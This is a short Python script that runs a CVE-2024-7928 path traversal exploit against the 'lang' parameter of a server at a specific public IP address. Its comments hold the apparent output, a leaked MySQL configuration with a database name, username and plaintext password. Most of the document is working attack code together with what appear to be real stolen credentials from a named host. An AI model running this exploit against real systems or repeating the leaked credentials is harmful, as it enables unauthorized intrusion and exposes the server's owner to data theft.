from unsafe import exploits

penetration_tester = exploits.CVE_2024_7928(
    url="http://47.105.229.158:9001",
    path="/index/ajax/lang",
    key="lang",
    value="../../application/database",
)
result = penetration_tester.check_vuln()
if result is not None:
    print("Website/Server is vulnerable !")
    print("\n".join([f"{k} : {v}" for k, v in result.items()]))
else:
    print("Website/Server is not vulnerable !")

# Website/Server is vulnerable !
# type : mysql
# hostname : localhost
# database : weihaishuijia
# username : weihaishuijia
# password : JB3jXaeFGxSbAkHL
# hostport :
# dsn :
# params : {}
# charset : utf8
# prefix : ss_
# debug : True
# deploy : 0
# rw_separate : False
# master_num : 1
# slave_no :
# fields_strict : True
# resultset_type : array
# auto_timestamp : False
# datetime_format : False
# sql_explain : False
